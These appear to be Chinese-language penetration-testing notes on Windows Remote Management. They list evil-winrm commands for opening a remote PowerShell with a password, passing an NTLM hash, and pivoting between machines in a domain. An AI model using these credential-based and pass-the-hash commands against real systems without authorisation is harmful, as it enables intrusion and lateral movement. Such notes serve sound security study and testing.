# WinRm（Windows Remote Management）

## 介绍

本质上：远程PowerShell/Cmd接口

端口：5985->HTTP

端口：5986->HTTPS

默认系统：Windows Server

WinRm=WindowsSSH

不用图形界面、速度快、权限清晰、适合提权、横向

判断是否使用Winrm

有没有Windows用户名、密码/NTLM hash、有没有Winrm登录权限

## 场景1：有用户名+密码

evil-winrm -i targetIp -u username -p password

#### 需要：

Ip、user、pass

#### 得到：

powershell

## 场景2：有NTLM Hash（横向移动）

evil-winrm -i TargetIp -u username -H <NTLM_HASH>

#### 需要：

Ip、user、NtlmHash

#### 得到：

powershell

## 场景3：域环境横向移动

做为跳板进入其他机器

## 工具

### evil-winrm

#### 基本

evil-winrm -i ip -u user -p pass

#### 域用户

evil-winrm -i ip -u user -d domain -p pass

#### Pass The Hash

evil-winrm -i ip -u user -H <NTLM_Hash>